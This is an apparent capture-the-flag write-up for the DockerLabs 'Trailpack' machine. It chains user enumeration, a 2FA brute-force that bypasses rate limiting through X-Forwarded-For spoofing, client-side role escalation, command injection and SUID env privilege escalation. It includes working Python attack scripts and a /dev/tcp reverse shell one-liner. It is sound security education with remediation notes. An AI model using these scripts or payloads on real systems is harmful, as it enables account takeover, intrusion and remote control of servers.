// 01

Summary

Trailpack is a Intermediate difficulty machine from DockerLabs that simulates a realistic web application with multiple chained vulnerabilities. Unlike single-exploit machines, this one requires identifying and sequentially abusing four distinct security flaws before achieving full root access.

The target is a Django-based web application running on port 8000 that exposes a user registration and authentication flow protected by a Two-Factor Authentication (2FA) PIN system. Administrative features are role-gated, and a review submission form is present once authenticated.

The attack chain begins by leveraging an information disclosure vulnerability in the registration form, which inadvertently confirms whether a given DNI (Spanish national ID) is already registered — functioning as an oracle for valid user enumeration. After discovering a valid DNI and cracking the password with Hydra, a 2FA rate-limiting bypass via the X-Forwarded-For header allows brute-forcing the PIN. A client-side role escalation via Burp Suite's match-replace feature elevates privileges to admin. Finally, an OS command injection vulnerability in the reviews panel delivers a reverse shell, and a misonfigured SUID binary escalates to root.

# Vulnerability Technique / Tool Impact
1 User Enumeration (DNI Oracle) Custom fuzzer.py + registration endpoint Valid DNI + password brute-force with Hydra
2 2FA Rate-Limit Bypass X-Forwarded-For rotation + custom Python script Full 2FA bypass, authenticated session obtained
3 Client-Side Role Escalation Burp Suite match-replace on response body Application grants admin-level privileges
4 OS Command Injection + PrivEsc Reverse shell via /dev/tcp + SUID env binary Remote code execution as root

// Key takeaway

This machine illustrates how low-severity vulnerabilities in isolation can become critical when chained together. A verbose error message, a missing rate-limit header check, client-side trust, and unvalidated input each seem manageable alone — but combined they produce a full root compromise.

// 03

Vulnerability 1 — DNI Oracle & User Enumeration

01
Information Disclosure
Registration endpoint leaks existing user DNIs

The registration endpoint behaves as a user-enumeration oracle: it returns a distinct response ("Este NIF ya está registrado") when a supplied DNI belongs to an existing account. By iterating through a range of valid DNI combinations and checking for this string, we can enumerate all registered identities without needing any authentication.

DNIs in Spain follow a strict format: 8 digits + 1 letter, where the letter is deterministically derived from number % 23 against the alphabet TRWAGMYFPDXBNJZSQVHLCKE. This means the entire space for a given numeric prefix is fully enumerable. We build a multithreaded Python script to cover the range 71900000–71999999 (100,000 combinations) at high speed.

4
Run the DNI oracle fuzzer

The script uses Python's ThreadPoolExecutor (40 workers by default) to fire concurrent registration POST requests. Each request includes a freshly generated DNI and a throw-away email. When the oracle string appears in the response body, the DNI is immediately written to discovered_dnis.txt. The approach avoids creating real accounts — it submits the request but relies on the error appearing before any account is actually written, since the validation fires first.

fuzzer.py
# DISCLAIMER: PoC for controlled lab environment only — educational purposes
 
import argparse, http.client, urllib.parse, threading
from concurrent.futures import ThreadPoolExecutor
 
ORACLE = "Este NIF ya está registrado. ¿Tienes cuenta? Inicia sesión."
 
def calculate_dni(n):
letters = "TRWAGMYFPDXBNJZSQVHLCKE"
return f"{n:08d}" + letters[n % 23]
 
def probe(host, port, number, found, lock):
dni = calculate_dni(number)
params = urllib.parse.urlencode({
"name": "luis", "email": f"test_{number}@trailpack.lab",
"dni": dni, "password": "Password123!", "terms": "on"
})
conn = http.client.HTTPConnection(host, port, timeout=10)
conn.request("POST", "/register", body=params,
headers={"Content-Type": "application/x-www-form-urlencoded"})
resp = conn.getresponse()
if ORACLE in resp.read().decode(errors="ignore"):
with lock:
found.append(dni)
print(f"[+] DNI FOUND: {dni}")

// 04

Vulnerability 2 — 2FA Rate-Limit Bypass via X-Forwarded-For

02
Authentication Bypass
2FA attempt counter is tracked per IP, not per session

After submitting valid credentials, the application redirects to /verify-mfa and requires a 4-digit PIN. The server enforces a limit of 2–3 incorrect attempts before blocking further submissions. At first glance this seems to make brute-forcing the 10,000 possible PINs infeasible.

However, the rate-limit implementation has a critical flaw: it tracks failed attempts by the client IP address taken from the X-Forwarded-For header — without any validation. This header is freely settable by any HTTP client, meaning we can impersonate a different IP on every single request. The lockout counter resets because each request appears to come from a new origin, giving us unlimited attempts distributed across the full PIN space.

6
Intercept the MFA request in Burp

We log in with the cracked credentials, intercept the POST /verify-mfa request in Burp Suite, and send it to the Repeater. Crucially, we note the active session_id cookie — this must remain constant across all our brute-force attempts so the server associates each PIN attempt with our authenticated session context. We manually add the X-Forwarded-For header and confirm the bypass logic works by trying two wrong PINs without getting locked out.

BURP / MODIFIED REQUEST
POST /verify-mfa HTTP/1.1
Host: 172.17.0.2:8000
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 10.10.10.11 <— spoofed origin IP (changes each request)
Cookie: session_id=7bb2b01821a202aa1138bf8131a79b4f6d0bd4e4a9cc953b7095b858c3a56079
 
pin=1111
7
Automate the PIN brute-force with XFF rotation

We write a Python script that iterates over all 10,000 possible PINs (0000 to 9999), injecting a randomly generated IPv4 address in the X-Forwarded-For header on every request. The script uses a persistent requests.Session to keep the session_id cookie fixed, and detects a successful PIN by the absence of the failure string "Código incorrecto" in the response body.

Before running, replace the SESSION_ID constant with the value copied from your own intercepted request, as session tokens are unique per login.

mfa_bypass.py
import requests, random
 
TARGET = "http://172.17.0.2:8000/verify-mfa"
SESSION = "<paste_your_session_id_here>" # from intercepted cookie
 
def random_ip():
return ".".join(str(random.randint(1,254)) for _ in range(4))
 
session = requests.Session()
session.cookies.set("session_id", SESSION)
 
for i in range(10000):
pin = f"{i:04d}"
resp = session.post(TARGET, allow_redirects=False,
headers={"X-Forwarded-For": random_ip(),
"Content-Type": "application/x-www-form-urlencoded"},
data={"pin": pin})
if "Código incorrecto" not in resp.text:
print(f"\n[+] PIN FOUND: {pin}"); break
print(f"[*] Trying {pin}", end="\r")
[*] Initiating XFF-rotation attack on /verify-mfa ...
[*] Trying 0000
[*] Trying 0001
...
 
[+] PIN FOUND: 4821

// Root cause

The server trusts the X-Forwarded-For header to determine the client's real IP address but never validates or sanitises it. Rate-limiting decisions should always be based on the connection-level TCP source IP or a cryptographically signed session identifier — never a header that any client can freely forge.

Vulnerability 3 — Client-Side Role Escalation

03
Broken Access Control
Server trusts a client-supplied role value in the response

After successfully passing 2FA, we are logged in to the dashboard as a regular user. Monitoring Burp's HTTP history, we notice that the dashboard makes an API call to GET /api/me to retrieve our profile information. The response contains a JSON object including a "role" field.

Inspecting the user_info cookie reveals a Base64-encoded JSON payload — a classic sign of client-side trust. Decoding it reveals: {"user": "Carlos Mendoza", "role": "user", "email": "..."}. More critically, the application appears to rely on the role value returned in the API response body (and/or the cookie) to make access-control decisions on the client side, without a robust server-side re-check on every admin-restricted endpoint.

Observe the /api/me response
BURP / /api/me RESPONSE

9
Apply Burp Suite match-replace rule

We configure a Burp Suite Proxy match-and-replace rule that transparently rewrites every response passing through the proxy before it reaches the browser. The rule targets the response body and replaces the string "role":"user" with "role":"admin".

In Burp: Proxy → Settings → Match and Replace → Add. Set type to Response body, match: "role":"user", replace: "role":"admin". After saving, we hard-refresh the dashboard. The browser now receives the modified response, interprets us as an admin, and renders the full administration panel — including the review management section that will become our next attack surface.

# Burp match-replace rule
Type : Response body
Match : "role":"user"
Replace: "role":"admin"
 
# Modified /api/me response after rule is active
{"user":"Carlos Mendoza","role":"admin","email":"carlos.mendoza@trailpack.es"}
 
[✓] Admin panel now accessible in the browser

// Root cause

Authorization decisions must always be enforced server-side on every request using a trusted, tamper-proof session identifier — never based on a value returned to (and therefore controllable by) the client. Sending role information in a plain response body or an unsigned cookie violates the principle of server-side access control.

Vulnerability 4 — Command Injection & Privilege Escalation

04
OS Command Injection + SUID PrivEsc
Review field executes unsanitised shell input → root shell via env SUID

With admin access to the dashboard, we investigate all available input fields for injection vulnerabilities. The review submission panel accepts a numeric rating field. Testing it with standard payloads reveals that the application passes the field value directly to a shell command without any sanitisation or input validation. Submitting 1; whoami executes whoami and reflects the output back, confirming OS command injection.

11
Write reverse shell script to disk

We use the injection to write a reverse shell one-liner to disk. The echo command writes a Bash reverse shell to exploit.sh on the server's filesystem. The payload uses /dev/tcp, a Bash built-in that opens a TCP connection, redirecting stdin/stdout/stderr to our listener. Before triggering the shell, we start a netcat listener on our attacker machine on port 666.

// Shell stabilisation tip

The received shell is a raw, non-interactive TTY. To stabilise it and enable features like tab completion, Ctrl+C passthrough, and clear screen, spawn a proper TTY with: python3 -c 'import pty; pty.spawn("/bin/bash")' then background with Ctrl+Z, run stty raw -echo; fg, and set export TERM=xterm.

12
Privilege escalation — SUID binary

We are inside the container as user balutron. To escalate to root, we enumerate SUID binaries — executables that run with the file owner's privileges (typically root) regardless of who invokes them. The find command below searches the entire filesystem for any file with the SUID bit set.

PRIVESC — FIND SUID
balutron@c4c27dc4e37b:/app$ find / -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/env <— SUID set on env — critical finding
/usr/bin/mount
/usr/bin/umount

/usr/bin/env has the SUID bit set. The env binary is used to run commands in a modified environment, and the -p flag to /bin/sh instructs the shell to preserve the effective UID rather than dropping privileges. Since env runs as root due to SUID, the spawned shell inherits root's effective UID — granting us a full root shell.

PRIVESC — SUID env
balutron@c4c27dc4e37b:/app$ env /bin/sh -p
$ whoami
root
$ id
uid=0(root) gid=1000(balutron) groups=1000(balutron)
#  

// Root obtained ✓

Full root access achieved. The chain is complete: DNI enumeration → credential brute-force → 2FA bypass → role escalation → command injection → SUID privilege escalation. Four vulnerabilities, one fully compromised container running as root.

// Root cause

The env binary should never have the SUID bit set in a production or containerised environment. Any binary listed on GTFOBins with a SUID entry represents an immediate privilege escalation path when misconfigured. Combined with the command injection that delivered our initial shell, this makes the final escalation trivial.

Tool Reference

Burp Suite
Proxy → Match and Replace
Web application security testing platform used to intercept, inspect, and modify HTTP traffic. The match-and-replace feature allows transparent rewriting of request/response content in real time.
  • HTTP History — all proxied requests and responses
  • Repeater — manually re-send and modify requests
  • Match & Replace — auto-rewrite passing traffic
  • Scope — restrict proxy focus to target host
Hydra
hydra -l USER -P LIST TARGET http-post-form
Fast and parallelised network login cracker. The http-post-form module supports custom POST endpoints with configurable success/failure detection strings.
  • -l — single username / login
  • -P — password wordlist file
  • -s — custom port
  • -V — verbose, show each attempt
  • F=string — failure condition string
netcat (nc)
nc -nlvp <port>
The TCP/UDP Swiss Army knife. Used here as a reverse shell listener: waits for an incoming connection from the target and provides an interactive shell session.
  • -n — no DNS resolution
  • -l — listen mode
  • -v — verbose output
  • -p — specify port number
find (SUID search)
find / -perm -4000 2>/dev/null
Searches the entire filesystem for binaries with the SUID bit set. SUID binaries run as the file owner (usually root), making them prime privilege escalation candidates when misconfigured.
  • -perm -4000 — SUID bit set
  • -perm -2000 — SGID bit set
  • 2>/dev/null — suppress permission errors
  • Cross-reference results with GTFOBins
ThreadPoolExecutor (Python)
from concurrent.futures import ThreadPoolExecutor
Python standard library module for managing a pool of threads. Used in fuzzer.py to issue up to 40 concurrent HTTP registration requests, dramatically reducing the time to enumerate 100,000 DNI candidates.
  • max_workers — thread pool size
  • executor.map(fn, iterable) — parallel dispatch
  • Use locks (threading.Lock) for shared state
env (SUID exploit)
env /bin/sh -p
When the env binary has the SUID bit set and is owned by root, it can be used to spawn a privileged shell. The -p flag to /bin/sh tells the shell not to reset the effective UID.
  • env — run program in modified environment
  • /bin/sh -p — shell preserving effective UID
  • Listed on GTFOBins under SUID

Glossary

DNI Oracle / User Enumeration
An enumeration oracle is any application behaviour that allows an attacker to distinguish between two states — in this case, whether a given DNI belongs to a registered user or not. Even a subtle difference in response content, timing, or HTTP status code is enough to build an automated scanner. The OWASP Testing Guide (OTG-IDENT-004) specifically covers user enumeration as a high-priority test case, since it provides attackers with the first half of a valid credential pair (the username/identity) at zero cost. The correct remediation is to return a generic, identical response regardless of whether the DNI is known.
X-Forwarded-For Header
X-Forwarded-For (XFF) is an HTTP header added by reverse proxies and load balancers to preserve the originating client's IP address as the request traverses infrastructure. Its format is X-Forwarded-For: client, proxy1, proxy2. Because HTTP headers are fully user-controlled, any application that uses XFF to make security-sensitive decisions (rate limiting, geo-blocking, access control) without proper validation is vulnerable to IP spoofing. The only reliable source of the real client IP is the TCP connection's remote address, which cannot be forged on a standard TCP connection.
Two-Factor Authentication (2FA) & Rate Limiting
2FA adds a second verification factor beyond a password — typically a time-based one-time password (TOTP) or a PIN sent via SMS/email. Its security depends entirely on the server enforcing a strict attempt limit per session before the code expires. Tracking attempts by IP address (instead of by session or account) is a well-known anti-pattern: IP-based controls are trivially bypassed via VPNs, proxies, or, as demonstrated here, by spoofing the X-Forwarded-For header. Robust 2FA implementations lock the account or the specific code after 3–5 failed attempts regardless of source IP.
Client-Side Access Control
Client-side access control refers to the anti-pattern of making authorisation decisions based on data returned to — and therefore modifiable by — the end user. Common manifestations include role values stored in unsigned cookies, local storage, or API responses that the frontend reads to show or hide UI elements. An attacker who can modify this data (via a proxy, browser devtools, or Burp) can trivially elevate their privileges. All access control checks must be enforced server-side on every request using a tamper-proof, server-managed session. This class of vulnerability falls under OWASP A01:2021 — Broken Access Control, the top web application risk category.
OS Command Injection
OS command injection occurs when an application passes unsanitised user-supplied input to a system shell. Attackers can append additional shell commands using metacharacters such as ;, &&, |, or backticks. In this lab, the review rating field was passed directly to a shell call, allowing arbitrary command execution. Prevention requires never constructing shell commands from user input — use parameterised APIs (e.g. Python's subprocess with a list argument and shell=False) or robust allowlist validation of all inputs. This maps to OWASP A03:2021 — Injection.
SUID Bit & GTFOBins
The SUID (Set User ID) bit is a Unix permission flag that causes an executable to run with the permissions of its owner rather than the invoking user. This is intentional for binaries like passwd (which needs root to write /etc/shadow), but catastrophic when applied to general-purpose tools. GTFOBins (gtfobins.github.io) is a curated list of Unix binaries that can be exploited when they have SUID set, sudo privileges, or are invoked from a restricted shell. env with SUID is a textbook GTFOBins entry: env /bin/sh -p spawns a root shell immediately because sh -p preserves the elevated effective UID inherited from the SUID binary.
Reverse Shell via /dev/tcp
A reverse shell initiates the TCP connection from the victim to the attacker, bypassing firewalls that block inbound connections. /dev/tcp/host/port is a Bash built-in pseudo-device that opens a TCP socket without requiring any external binaries. The payload bash -i >& /dev/tcp/10.0.2.15/666 0>&1 redirects all three file descriptors (stdin, stdout, stderr) over the TCP connection to the attacker's listener, creating a fully interactive remote shell session. This technique requires that the target system runs Bash and that the /dev/tcp virtual filesystem is enabled in the build (it is on most Linux distributions).
